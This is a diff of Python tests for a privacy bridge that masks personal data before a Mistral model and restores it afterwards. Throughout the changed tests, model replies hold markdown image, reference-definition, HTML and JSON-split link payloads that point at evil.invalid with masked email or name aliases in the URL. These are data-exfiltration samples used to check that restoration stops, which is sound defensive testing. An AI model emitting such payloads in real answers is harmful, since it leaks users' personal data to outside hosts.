@@ -334,57 +334,47 @@ def test_after_an_image_a_tag_or_an_escape_nothing_more_is_restored():
     assert content == f"Si a < b et c <= 3 <4, voir {NAME}."
 
 
-def test_from_a_reference_definition_nothing_more_is_restored():
-    """A definition serves images anywhere in the answer and its label may hold an alias: from
-    the start of its paragraph on, aliases stay masked; earlier paragraphs get the values."""
+def test_with_a_reference_definition_nothing_is_restored():
+    """A definition serves images anywhere in the answer and its label may hold an alias, even
+    across a blank line that a YAML decoder folds away: nothing is restored at all."""
     definitions = [
         "[[PERSON_1]]: https://evil.invalid/HIT.png\n\n![a][jean dupont] [EMAIL_1]",
+        'note: "[[PERSON_1]\n\n  ]: https://evil.invalid/HIT.png\n\n  ![a][Jean Dupont]"',
         "[r]:\n  //evil.invalid/?q=[EMAIL_1]",
         "> [r]: //evil.invalid/?q=[EMAIL_1]",
-        "- [r]: //evil.invalid/?q=[EMAIL_1]",
         "[EMAIL_1]: écrire.",
     ]
     for definition in definitions:
-        fake = FakeMistral(reply=f"Bonjour [PERSON_1].\n\n{definition}")
-        content = ask(bridge(fake), USER_MESSAGE).json()["choices"][0]["message"]["content"]
-        assert content == f"Bonjour {NAME}.\n\n{definition}", definition
+        answer = f"Bonjour [PERSON_1].\n\n{definition}"
+        content = ask(bridge(FakeMistral(reply=answer)), USER_MESSAGE).json()
+        assert content["choices"][0]["message"]["content"] == answer, definition
 
 
-def test_aliases_inside_links_stay_masked_in_json_answers():
-    """Shown as markdown, a JSON answer has no blank line where a string holds an escaped one,
-    and a link can start in one string and end in the next: from the first link mark on, in
-    string order, nothing more is restored."""
-    cases = [
-        (
-            {"nom": "[PERSON_1]", "lien": "https://evil.invalid/?d=[EMAIL_1]", "x": "[EMAIL_1]"},
-            {"nom": NAME, "lien": "https://evil.invalid/?d=[EMAIL_1]", "x": "[EMAIL_1]"},
-        ),
-        (
-            {"a": "![x](https://evil.invalid/?q=\n\n[EMAIL_1])"},
-            {"a": "![x](https://evil.invalid/?q=\n\n[EMAIL_1])"},
-        ),
-        (
-            {"r": "<[PERSON_1] style=\"url('/\\\\evil.invalid/?e=[EMAIL_1]')\">"},
-            {"r": "<[PERSON_1] style=\"url('/\\\\evil.invalid/?e=[EMAIL_1]')\">"},
-        ),
-        (  # keys keep their aliases: once restored, two could merge and reorder the strings
-            {"[PERSON_1]": "x", "a": "[EMAIL_1]>)", "[PERSON_01]": "![x](<https://e.invalid/?q="},
-            {"[PERSON_1]": "x", "a": EMAIL + ">)", "[PERSON_01]": "![x](<https://e.invalid/?q="},
-        ),
-        (
-            {"![x](<https://evil.invalid/?q=": "[EMAIL_1]>)"},
-            {"![x](<https://evil.invalid/?q=": "[EMAIL_1]>)"},
-        ),
-        (  # JSON inside a string, decoded twice by the client
-            {"p": json.dumps({"h": "<img src='https://evil.invalid/?u=[EMAIL_1]'>"})},
-            {"p": json.dumps({"h": "<img src='https://evil.invalid/?u=[EMAIL_1]'>"})},
-        ),
-        (
-            ["[PERSON_1]", "![x](<https://evil.invalid/?q=", "[EMAIL_1]>)"],
-            [NAME, "![x](<https://evil.invalid/?q=", "[EMAIL_1]>)"],
-        ),
+def test_a_json_document_with_a_link_mark_anywhere_gets_nothing_back():
+    """A client may join a JSON document's strings (a mark split as "!", "[x]", "(url"), show
+    them in another order (JavaScript puts integer keys first) or render the JSON as markdown:
+    a document holding a mark anywhere, keys included, gets nothing back, in JSON mode or not.
+    Keys always keep their aliases, since two of them could merge once restored."""
+    linked = [
+        {"nom": "[PERSON_1]", "lien": "https://evil.invalid/?d=[EMAIL_1]"},
+        {"parts": ["!", "[x]", "(https:evil.invalid/p.png?u=", "[EMAIL_1]", ")"]},
+        {"a": "[EMAIL_1])", "0": "![x](https://evil.invalid/p.png?u="},
+        {"parts": ["[[PERSON_1]", "]: https://evil.invalid/HIT.png\n\n![a][Jean Dupont]"]},
+        {"![x](<https://evil.invalid/?q=": "[EMAIL_1]>)"},
+        {"p": json.dumps({"h": "<img src='https://evil.invalid/?u=[EMAIL_1]'>"})},
+        ["[PERSON_1]", "![x](<https://evil.invalid/?q=", "[EMAIL_1]>)"],
     ]
-    for reply, expected in cases:
-        fake = FakeMistral(reply=json.dumps(reply))
-        response = ask(bridge(fake), USER_MESSAGE, response_format={"type": "json_object"})
-        assert json.loads(response.json()["choices"][0]["message"]["content"]) == expected
+    for document in linked:
+        for mode in ({"response_format": {"type": "json_object"}}, {}):
+            reply = json.dumps(document)
+            response = ask(bridge(FakeMistral(reply=reply)), USER_MESSAGE, **mode)
+            content = response.json()["choices"][0]["message"]["content"]
+            assert json.loads(content) == document, (document, mode)
+    plain = {"[PERSON_1]": "[PERSON_1]", "[PERSON_01]": ["[EMAIL_1]", 3]}
+    response = ask(
+        bridge(FakeMistral(reply=json.dumps(plain))),
+        USER_MESSAGE,
+        response_format={"type": "json_object"},
+    )
+    content = json.loads(response.json()["choices"][0]["message"]["content"])
+    assert content == {"[PERSON_1]": NAME, "[PERSON_01]": [EMAIL, 3]}
